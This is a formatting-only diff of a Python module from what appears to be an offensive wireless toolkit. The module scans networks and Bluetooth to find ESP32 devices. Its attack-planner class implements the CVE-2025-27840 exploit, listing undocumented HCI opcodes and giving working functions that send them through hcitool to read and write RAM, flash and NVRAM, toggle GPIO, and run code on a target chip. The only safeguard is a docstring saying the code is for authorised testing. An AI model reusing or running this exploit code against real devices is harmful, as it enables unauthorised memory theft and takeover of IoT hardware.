@@ -26,6 +26,7 @@ if TYPE_CHECKING:
 
 try:
     import aiohttp
+
     AIOHTTP_AVAILABLE = True
 except ImportError:
     AIOHTTP_AVAILABLE = False
@@ -37,16 +38,18 @@ logger = structlog.get_logger(__name__)
 
 class ESP32DetectionMethod(Enum):
     """Methods used to detect ESP32 devices."""
-    WIFI_OUI = "wifi_oui"                   # MAC OUI A4:CF:12
-    BLE_MANUFACTURER = "ble_manufacturer"   # BLE manufacturer data
-    BLE_SERVICE_UUID = "ble_service_uuid"   # BLE service UUIDs
-    MDNS_HOSTNAME = "mdns_hostname"         # mDNS hostname patterns
-    HTTP_SERVER_HEADER = "http_header"      # HTTP Server header
+
+    WIFI_OUI = "wifi_oui"  # MAC OUI A4:CF:12
+    BLE_MANUFACTURER = "ble_manufacturer"  # BLE manufacturer data
+    BLE_SERVICE_UUID = "ble_service_uuid"  # BLE service UUIDs
+    MDNS_HOSTNAME = "mdns_hostname"  # mDNS hostname patterns
+    HTTP_SERVER_HEADER = "http_header"  # HTTP Server header
 
 
 @dataclass
 class ESP32Device:
     """Detected ESP32 device information."""
+
     mac_address: str
     ip_address: str | None = None
     detection_methods: list[ESP32DetectionMethod] = field(default_factory=list)
@@ -84,34 +87,23 @@ ESP32_BLE_PATTERNS = {
 }
 
 # ESP32 mDNS hostname patterns
-ESP32_MDNS_PATTERNS = [
-    "esp32",
-    "espressif",
-    "esp-",
-    "espressif-",
-]
+ESP32_MDNS_PATTERNS = ["esp32", "espressif", "esp-", "espressif-"]
 
 # ESP32 HTTP Server headers
-ESP32_HTTP_HEADERS = [
-    "esp32",
-    "espressif",
-    "ESP32",
-    "ESP8266",
-    "Espressif",
-]
+ESP32_HTTP_HEADERS = ["esp32", "espressif", "ESP32", "ESP8266", "Espressif"]
 
 
 class ESP32Detector:
     """
     Passive ESP32 device detector.
-    
+
     Detects ESP32 devices through multiple passive methods:
     1. WiFi MAC OUI matching (primary method)
     2. BLE manufacturer data analysis
     3. BLE service UUID matching
     4. mDNS hostname patterns
     5. HTTP Server header fingerprinting
-    
+
     Integrates with existing WiFi and BLE scanners.
     """
 
@@ -134,9 +126,9 @@ class ESP32Detector:
 
     def _get_oui(self, mac: str) -> str:
         """Extract OUI from MAC address."""
-        parts = mac.lower().replace('-', ':').split(':')
+        parts = mac.lower().replace("-", ":").split(":")
         if len(parts) >= 3:
-            return ':'.join(parts[:3])
+            return ":".join(parts[:3])
         return ""
 
     def _calculate_confidence(self, device: ESP32Device) -> float:
@@ -166,15 +158,14 @@ class ESP32Detector:
         detected = []
 
         for network in networks:
-            mac = getattr(network, 'bssid', None) or getattr(network, 'mac', None)
+            mac = getattr(network, "bssid", None) or getattr(network, "mac", None)
             if not mac:
                 continue
 
             oui = self._get_oui(mac)
             if oui in ESP32_OUIS:
                 device = ESP32Device(
-                    mac_address=mac,
-                    detection_methods=[ESP32DetectionMethod.WIFI_OUI],
+                    mac_address=mac, detection_methods=[ESP32DetectionMethod.WIFI_OUI]
                 )
                 device.confidence = self._calculate_confidence(device)
                 detected.append(device)
@@ -189,7 +180,7 @@ class ESP32Detector:
         detected = []
 
         for dev in ble_devices:
-            mac = getattr(dev, 'address', None) or getattr(dev, 'mac', None)
+            mac = getattr(dev, "address", None) or getattr(dev, "mac", None)
             if not mac:
                 continue
 
@@ -197,7 +188,7 @@ class ESP32Detector:
             confidence_boost = 0.0
 
             # Check manufacturer data
-            manufacturer_data = getattr(dev, 'manufacturer_data', None)
+            manufacturer_data = getattr(dev, "manufacturer_data", None)
             if manufacturer_data:
                 # Check for Espressif manufacturer ID (0x02E5) or other ESP32 patterns
                 # Company ID 0x02E5 = Espressif Systems
@@ -207,7 +198,7 @@ class ESP32Detector:
                         confidence_boost += 0.2
 
             # Check service UUIDs
-            service_uuids = getattr(dev, 'service_uuids', None) or getattr(dev, 'services', None)
+            service_uuids = getattr(dev, "service_uuids", None) or getattr(dev, "services", None)
             if service_uuids:
                 for uuid in service_uuids:
                     uuid_lower = uuid.lower()
@@ -234,13 +225,13 @@ class ESP32Detector:
         detected = []
 
         for service in mdns_services:
-            hostname = service.get('hostname', '').lower()
-            ip = service.get('ip', '')
+            hostname = service.get("hostname", "").lower()
+            ip = service.get("ip", "")
 
             for pattern in ESP32_MDNS_PATTERNS:
                 if pattern in hostname:
                     # Try to extract MAC from service info or use IP
-                    mac = service.get('mac') or service.get('mac_address')
+                    mac = service.get("mac") or service.get("mac_address")
                     if not mac and ip:
                         # Try to get MAC via ARP
                         mac = await self._get_mac_from_ip(ip)
@@ -263,19 +254,17 @@ class ESP32Detector:
         """Get MAC address from IP using ARP."""
         try:
             proc = await asyncio.create_subprocess_exec(
-                "arp", "-n", ip,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
+                "arp", "-n", ip, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
             stdout, _ = await proc.communicate()
             output = stdout.decode()
 
             # Parse ARP output for MAC
-            for line in output.split('\n'):
+            for line in output.split("\n"):
                 if ip in line:
                     parts = line.split()
                     for part in parts:
-                        if ':' in part and len(part) == 17:
+                        if ":" in part and len(part) == 17:
                             return part.lower()
         except Exception:
             pass
@@ -283,7 +272,12 @@ class ESP32Detector:
 
     async def probe_http(self, target: ESP32Device) -> ESP32Device | None:
         """Probe ESP32 via HTTP to get firmware info."""
-        if not self.enable_http_probe or not target.ip_address or not AIOHTTP_AVAILABLE or aiohttp is None:
+        if (
+            not self.enable_http_probe
+            or not target.ip_address
+            or not AIOHTTP_AVAILABLE
+            or aiohttp is None
+        ):
             return None
 
         if not self._http_session:
@@ -300,16 +294,23 @@ class ESP32Detector:
 
             for url in urls:
                 try:
-                    async with self._http_session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                    async with self._http_session.get(
+                        url, timeout=aiohttp.ClientTimeout(total=5)
+                    ) as resp:
                         if resp.status == 200:
-                            server = resp.headers.get('Server', '')
+                            server = resp.headers.get("Server", "")
                             target.http_server = server
 
                             # Check headers for ESP32 indicators
                             for header_val in server.split():
                                 if any(h in header_val.lower() for h in ESP32_HTTP_HEADERS):
-                                    if ESP32DetectionMethod.HTTP_SERVER_HEADER not in target.detection_methods:
-                                        target.detection_methods.append(ESP32DetectionMethod.HTTP_SERVER_HEADER)
+                                    if (
+                                        ESP32DetectionMethod.HTTP_SERVER_HEADER
+                                        not in target.detection_methods
+                                    ):
+                                        target.detection_methods.append(
+                                            ESP32DetectionMethod.HTTP_SERVER_HEADER
+                                        )
                                     target.confidence = self._calculate_confidence(target)
                                     break
 
@@ -331,11 +332,12 @@ class ESP32Detector:
     def _extract_firmware(self, text: str) -> str | None:
         """Extract firmware version from HTTP response."""
         import re
+
         patterns = [
-            r'firmware[_\s:=]+([\d\.\-_a-zA-Z]+)',
-            r'version[_\s:=]+([\d\.\-_a-zA-Z]+)',
-            r'SDK[_\s:=]+([\d\.\-_a-zA-Z]+)',
-            r'ESP-IDF[_\s:=]+([\d\.\-_a-zA-Z]+)',
+            r"firmware[_\s:=]+([\d\.\-_a-zA-Z]+)",
+            r"version[_\s:=]+([\d\.\-_a-zA-Z]+)",
+            r"SDK[_\s:=]+([\d\.\-_a-zA-Z]+)",
+            r"ESP-IDF[_\s:=]+([\d\.\-_a-zA-Z]+)",
         ]
         for pattern in patterns:
             match = re.search(pattern, text, re.IGNORECASE)
@@ -346,20 +348,18 @@ class ESP32Detector:
     def _extract_chip_model(self, text: str) -> str | None:
         """Extract chip model from HTTP response."""
         text_lower = text.lower()
-        if 'esp32-s3' in text_lower:
-            return 'ESP32-S3'
-        if 'esp32-s2' in text_lower:
-            return 'ESP32-S2'
-        if 'esp32-c3' in text_lower:
-            return 'ESP32-C3'
-        if 'esp32' in text_lower:
-            return 'ESP32'
+        if "esp32-s3" in text_lower:
+            return "ESP32-S3"
+        if "esp32-s2" in text_lower:
+            return "ESP32-S2"
+        if "esp32-c3" in text_lower:
+            return "ESP32-C3"
+        if "esp32" in text_lower:
+            return "ESP32"
         return None
 
     async def run_full_detection(
-        self,
-        target_network: str = "192.168.1.0/24",
-        callback: Callable[[str], None] | None = None,
+        self, target_network: str = "192.168.1.0/24", callback: Callable[[str], None] | None = None
     ) -> list[ESP32Device]:
         """Run complete ESP32 detection workflow."""
         all_devices = []
@@ -372,6 +372,7 @@ class ESP32Detector:
             callback("Scanning WiFi for ESP32 devices...")
 
         from urban_hs.modules.network import NmapScanner, ScanType
+
         nmap = NmapScanner()
 
         # Host discovery to get live hosts
@@ -382,7 +383,7 @@ class ESP32Detector:
         for host in hosts:
             mac = await self._get_mac_from_ip(host.ip)
             if mac:
-                network_mock = type('obj', (object,), {'bssid': mac})
+                network_mock = type("obj", (object,), {"bssid": mac})
                 detected = await self.detect_from_wifi_scan([network_mock])
                 wifi_devices.extend(detected)
 
@@ -396,6 +397,7 @@ class ESP32Detector:
         ble_devices = []
         try:
             from urban_hs.modules.ble import FastPairScanner
+
             ble_scanner = FastPairScanner(adapter=self.ble_adapter)
             await ble_scanner.start(scan_all=True)
             await asyncio.sleep(self.scan_timeout)
@@ -419,12 +421,11 @@ class ESP32Detector:
             hosts = await nmap.scan("192.168.1.0/24", ScanType.HOST_DISCOVERY, timeout=30)
             mdns_results = []
             for host in hosts:
-                for port_info in getattr(host, 'ports', []):
-                    if port_info.get('port') == 5353:  # mDNS port
-                        mdns_results.append({
-                            'hostname': getattr(host, 'hostname', ''),
-                            'ip': host.ip,
-                        })
+                for port_info in getattr(host, "ports", []):
+                    if port_info.get("port") == 5353:  # mDNS port
+                        mdns_results.append(
+                            {"hostname": getattr(host, "hostname", ""), "ip": host.ip}
+                        )
             mdns_devices = await self.detect_from_mdns(mdns_results)
         except Exception:
             mdns_devices = []
@@ -476,24 +477,109 @@ class ESP32AttackPlanner:
 
     EXPLOIT_HCI_COMMANDS = [
         # Reading commands
-        {"opcode": 0xFC00, "name": "Read RAM", "description": "Read arbitrary RAM address", "params": "address, length"},
-        {"opcode": 0xFC01, "name": "Write RAM", "description": "Write arbitrary RAM address", "params": "address, data"},
-        {"opcode": 0xFC02, "name": "Read ROM", "description": "Read ROM address", "params": "address, length"},
-        {"opcode": 0xFC03, "name": "Read GPIO", "description": "Read GPIO state", "params": "gpio_num"},
-        {"opcode": 0xFC04, "name": "Write GPIO", "description": "Write GPIO state", "params": "gpio_num, value"},
-        {"opcode": 0xFC05, "name": "Read NVRAM", "description": "Read NVRAM", "params": "address, length"},
-        {"opcode": 0xFC06, "name": "Write NVRAM", "description": "Write NVRAM", "params": "address, data"},
-        {"opcode": 0xFC07, "name": "Get Chip ID", "description": "Get chip ID/revision", "params": ""},
+        {
+            "opcode": 0xFC00,
+            "name": "Read RAM",
+            "description": "Read arbitrary RAM address",
+            "params": "address, length",
+        },
+        {
+            "opcode": 0xFC01,
+            "name": "Write RAM",
+            "description": "Write arbitrary RAM address",
+            "params": "address, data",
+        },
+        {
+            "opcode": 0xFC02,
+            "name": "Read ROM",
+            "description": "Read ROM address",
+            "params": "address, length",
+        },
+        {
+            "opcode": 0xFC03,
+            "name": "Read GPIO",
+            "description": "Read GPIO state",
+            "params": "gpio_num",
+        },
+        {
+            "opcode": 0xFC04,
+            "name": "Write GPIO",
+            "description": "Write GPIO state",
+            "params": "gpio_num, value",
+        },
+        {
+            "opcode": 0xFC05,
+            "name": "Read NVRAM",
+            "description": "Read NVRAM",
+            "params": "address, length",
+        },
+        {
+            "opcode": 0xFC06,
+            "name": "Write NVRAM",
+            "description": "Write NVRAM",
+            "params": "address, data",
+        },
+        {
+            "opcode": 0xFC07,
+            "name": "Get Chip ID",
+            "description": "Get chip ID/revision",
+            "params": "",
+        },
         {"opcode": 0xFC08, "name": "Get MAC", "description": "Get MAC address", "params": ""},
-        {"opcode": 0xFC09, "name": "Read Flash", "description": "Read flash memory", "params": "address, length"},
-        {"opcode": 0xFC0A, "name": "Write Flash", "description": "Write flash memory", "params": "address, data"},
-        {"opcode": 0xFC0B, "name": "Erase Flash", "description": "Erase flash sector", "params": "address"},
-        {"opcode": 0xFC0C, "name": "Read EFUSE", "description": "Read EFUSE block", "params": "block_num"},
-        {"opcode": 0xFC0D, "name": "Write EFUSE", "description": "Write EFUSE block", "params": "block_num, data"},
-        {"opcode": 0xFC0E, "name": "Get Chip Revision", "description": "Get chip revision", "params": ""},
-        {"opcode": 0xFC0F, "name": "Get Secure Boot Status", "description": "Get secure boot status", "params": ""},
-        {"opcode": 0xFC10, "name": "Get Flash Encryption Status", "description": "Get flash encryption status", "params": ""},
-        {"opcode": 0xFC11, "name": "Run User Code", "description": "Execute user code in RAM", "params": "address"},
+        {
+            "opcode": 0xFC09,
+            "name": "Read Flash",
+            "description": "Read flash memory",
+            "params": "address, length",
+        },
+        {
+            "opcode": 0xFC0A,
+            "name": "Write Flash",
+            "description": "Write flash memory",
+            "params": "address, data",
+        },
+        {
+            "opcode": 0xFC0B,
+            "name": "Erase Flash",
+            "description": "Erase flash sector",
+            "params": "address",
+        },
+        {
+            "opcode": 0xFC0C,
+            "name": "Read EFUSE",
+            "description": "Read EFUSE block",
+            "params": "block_num",
+        },
+        {
+            "opcode": 0xFC0D,
+            "name": "Write EFUSE",
+            "description": "Write EFUSE block",
+            "params": "block_num, data",
+        },
+        {
+            "opcode": 0xFC0E,
+            "name": "Get Chip Revision",
+            "description": "Get chip revision",
+            "params": "",
+        },
+        {
+            "opcode": 0xFC0F,
+            "name": "Get Secure Boot Status",
+            "description": "Get secure boot status",
+            "params": "",
+        },
+        {
+            "opcode": 0xFC10,
+            "name": "Get Flash Encryption Status",
+            "description": "Get flash encryption status",
+            "params": "",
+        },
+        {
+            "opcode": 0xFC11,
+            "name": "Run User Code",
+            "description": "Execute user code in RAM",
+            "params": "address",
+        },
         # ... more commands (29 total documented by Tarlogic)
     ]
 
@@ -501,39 +587,29 @@ class ESP32AttackPlanner:
         self.detector = detector
 
     async def execute_hci_command(
-        self,
-        target: ESP32Device,
-        opcode: int,
-        params: bytes = b"",
-        adapter: str = "hci0",
+        self, target: ESP32Device, opcode: int, params: bytes = b"", adapter: str = "hci0"
     ) -> dict[str, Any]:
         """
         Execute an undocumented HCI command on an ESP32 device.
-        
+
         This implements the CVE-2025-27840 HCI command injection.
         The ESP32 exposes 29 undocumented HCI commands (0xFC00-0xFC1C)
         that allow RAM/Flash/NVRAM/GPIO access via HCI.
-        
+
         Requires:
         - Bluetooth adapter supporting HCI raw commands (hcitool)
         - Device in connectable/discoverable mode
         - No authentication required (vulnerability)
-        
+
         WARNING: These commands can read/write arbitrary memory.
         Only use in authorized test environments.
         """
         # Check if hcitool is available
         if not shutil.which("hcitool"):
-            return {
-                "success": False,
-                "error": "hcitool not found. Install bluez package.",
-            }
+            return {"success": False, "error": "hcitool not found. Install bluez package."}
 
         if not target.mac_address:
-            return {
-                "success": False,
-                "error": "Target MAC address required",
-            }
+            return {"success": False, "error": "Target MAC address required"}
 
         try:
             # Build the HCI command
@@ -550,16 +626,16 @@ class ESP32AttackPlanner:
             if params_hex:
                 cmd.append(params_hex)
 
-            logger.info("Executing HCI command",
-                       target=target.mac_address,
-                       opcode=hex(opcode),
-                       params=params_hex)
+            logger.info(
+                "Executing HCI command",
+                target=target.mac_address,
+                opcode=hex(opcode),
+                params=params_hex,
+            )
 
             # Execute hcitool command
             proc = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
 
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
@@ -583,16 +659,10 @@ class ESP32AttackPlanner:
             }
 
         except TimeoutError:
-            return {
-                "success": False,
-                "error": "HCI command timed out (10s)",
-            }
+            return {"success": False, "error": "HCI command timed out (10s)"}
         except Exception as e:
             logger.error("HCI command execution failed", error=str(e))
-            return {
-                "success": False,
-                "error": str(e),
-            }
+            return {"success": False, "error": str(e)}
 
     def _parse_hci_response(self, opcode: int, response: str) -> dict[str, Any]:
         """Parse HCI command response."""
@@ -620,15 +690,11 @@ class ESP32AttackPlanner:
         return parsed
 
     async def execute_memory_dump(
-        self,
-        target: ESP32Device,
-        address: int,
-        length: int = 256,
-        adapter: str = "hci0",
+        self, target: ESP32Device, address: int, length: int = 256, adapter: str = "hci0"
     ) -> dict[str, Any]:
         """
         Read arbitrary RAM from ESP32 via undocumented HCI command (0xFC00).
-        
+
         This is the core CVE-2025-27840 exploit - read arbitrary memory.
         """
         # Build parameters: address (4 bytes, little endian) + length (2 bytes)
@@ -636,64 +702,41 @@ class ESP32AttackPlanner:
         return await self.execute_hci_command(target, 0xFC00, params, adapter)
 
     async def execute_gpio_read(
-        self,
-        target: ESP32Device,
-        gpio_num: int,
-        adapter: str = "hci0",
+        self, target: ESP32Device, gpio_num: int, adapter: str = "hci0"
     ) -> dict[str, Any]:
         """Read GPIO state via undocumented HCI command (0xFC03)."""
         params = gpio_num.to_bytes(1, "little")
         return await self.execute_hci_command(target, 0xFC03, params, adapter)
 
     async def execute_gpio_write(
-        self,
-        target: ESP32Device,
-        gpio_num: int,
-        value: int,
-        adapter: str = "hci0",
+        self, target: ESP32Device, gpio_num: int, value: int, adapter: str = "hci0"
     ) -> dict[str, Any]:
         """Write GPIO state via undocumented HCI command (0xFC04)."""
         params = gpio_num.to_bytes(1, "little") + value.to_bytes(1, "little")
         return await self.execute_hci_command(target, 0xFC04, params, adapter)
 
     async def execute_nvram_read(
-        self,
-        target: ESP32Device,
-        address: int,
-        length: int = 32,
-        adapter: str = "hci0",
+        self, target: ESP32Device, address: int, length: int = 32, adapter: str = "hci0"
     ) -> dict[str, Any]:
         """Read NVRAM via undocumented HCI command (0xFC05)."""
         params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
         return await self.execute_hci_command(target, 0xFC05, params, adapter)
 
     async def execute_nvram_write(
-        self,
-        target: ESP32Device,
-        address: int,
-        data: bytes,
-        adapter: str = "hci0",
+        self, target: ESP32Device, address: int, data: bytes, adapter: str = "hci0"
     ) -> dict[str, Any]:
         """Write NVRAM via undocumented HCI command (0xFC06)."""
         params = address.to_bytes(4, "little") + data
         return await self.execute_hci_command(target, 0xFC06, params, adapter)
 
     async def execute_flash_read(
-        self,
-        target: ESP32Device,
-        address: int,
-        length: int = 256,
-        adapter: str = "hci0",
+        self, target: ESP32Device, address: int, length: int = 256, adapter: str = "hci0"
     ) -> dict[str, Any]:
         """Read flash memory via undocumented HCI command (0xFC09)."""
         params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
         return await self.execute_hci_command(target, 0xFC09, params, adapter)
 
-    async def execute_chip_id(
-        self,
-        target: ESP32Device,
-        adapter: str = "hci0",
-    ) -> dict[str, Any]:
+    async def execute_chip_id(self, target: ESP32Device, adapter: str = "hci0") -> dict[str, Any]:
         """Get chip ID/revision via undocumented HCI command (0xFC07)."""
         return await self.execute_hci_command(target, 0xFC07, b"", adapter)
 
@@ -732,6 +775,7 @@ class ESP32AttackPlanner:
 # Convenience Functions
 # ============================================================
 
+
 async def detect_esp32_devices(
     target_network: str = "192.168.1.0/24",
     wifi_interface: str = "wlan0",
@@ -741,20 +785,16 @@ async def detect_esp32_devices(
 ) -> list[ESP32Device]:
     """Convenience function for ESP32 detection."""
     detector = ESP32Detector(
-        wifi_interface=wifi_interface,
-        ble_adapter=ble_adapter,
-        scan_timeout=scan_timeout,
+        wifi_interface=wifi_interface, ble_adapter=ble_adapter, scan_timeout=scan_timeout
     )
     return await detector.run_full_detection(target_network, callback)
 
 
-async def scan_esp32_ble(
-    ble_adapter: str = "hci0",
-    scan_timeout: int = 15,
-) -> list[ESP32Device]:
+async def scan_esp32_ble(ble_adapter: str = "hci0", scan_timeout: int = 15) -> list[ESP32Device]:
     """Quick BLE-only ESP32 scan."""
     detector = ESP32Detector(ble_adapter=ble_adapter, scan_timeout=scan_timeout)
     from urban_hs.modules.ble import FastPairScanner
+
     ble_scanner = FastPairScanner(adapter=ble_adapter)
     await ble_scanner.start(scan_all=True)
     await asyncio.sleep(scan_timeout)
